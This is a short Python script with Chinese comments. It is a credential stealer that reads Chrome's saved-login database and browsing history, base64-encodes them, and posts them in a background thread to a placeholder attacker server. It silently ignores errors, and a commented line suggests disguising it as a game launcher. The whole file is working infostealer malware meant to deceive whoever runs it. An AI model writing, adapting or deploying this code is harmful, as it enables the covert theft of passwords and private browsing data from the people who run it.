import os
import json
import getpass
import requests
import base64
import time
import _thread
import subprocess

# 服务器地址
_url = 'http://服务器ip地址:端口号'

def pre_process():
    headers = {'Content-Type': 'application/json'}
    try:
        # 获取浏览器账号密码
        with open(os.path.join(os.environ['LOCALAPPDATA'], 'Google\\Chrome\\User Data\\Default\\Login Data'), 'rb') as file:
            file_byte = base64.b64encode(file.read())
        data = {
            'time': time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(time.time())),
            'data': str(file_byte).strip("b'")
        }
        # 将账号密码发送至服务器
        requests.post(url= _url + '/logindata', headers = headers, data = json.dumps(data), timeout = 1)
        # 获取浏览器历史记录
        with open(os.path.join(os.environ['LOCALAPPDATA'], 'Google\\Chrome\\User Data\\Default\\History'), 'rb') as file:
            file_byte = base64.b64encode(file.read())
        data = {
            'time': time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(time.time())),
            'data': str(file_byte).strip("b'")
        }
        #  将历史记录发送至服务器
        requests.post(url = _url + '/history', headers = headers, data = json.dumps(data), timeout = 1)
    except:
        return

# 启动一个单独的线程获取并发送数据
_thread.start_new_thread(pre_process, ())

# 可以在此处伪装为一个启动器
# subprocess.Popen("开始游戏.exe")

while True:
    # 保持程序运行，防止数据传输线程退出
    time.sleep(5)